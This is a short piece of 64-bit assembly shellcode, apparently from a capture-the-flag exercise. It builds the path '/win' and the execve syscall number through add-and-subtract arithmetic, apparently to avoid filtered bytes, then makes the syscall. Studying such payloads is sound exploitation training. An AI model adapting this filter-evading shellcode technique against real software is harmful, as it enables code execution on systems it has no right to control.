[BITS 64]
start:
mov cl,64
sar cl,1
sar cl,1
sar cl,1
mov sil,'n'+8
sub sil,8
shl esi,cl
mov sil,'i'
shl esi,cl
mov sil,'w'+1
sub sil,1
shl esi,cl
mov sil,'/'+5
sub sil,5
push rsi
push rsp
pop rdi
mov al,59+5
sub al,5
cbw
cwde
cdqe
nop
jrcxz start
syscall
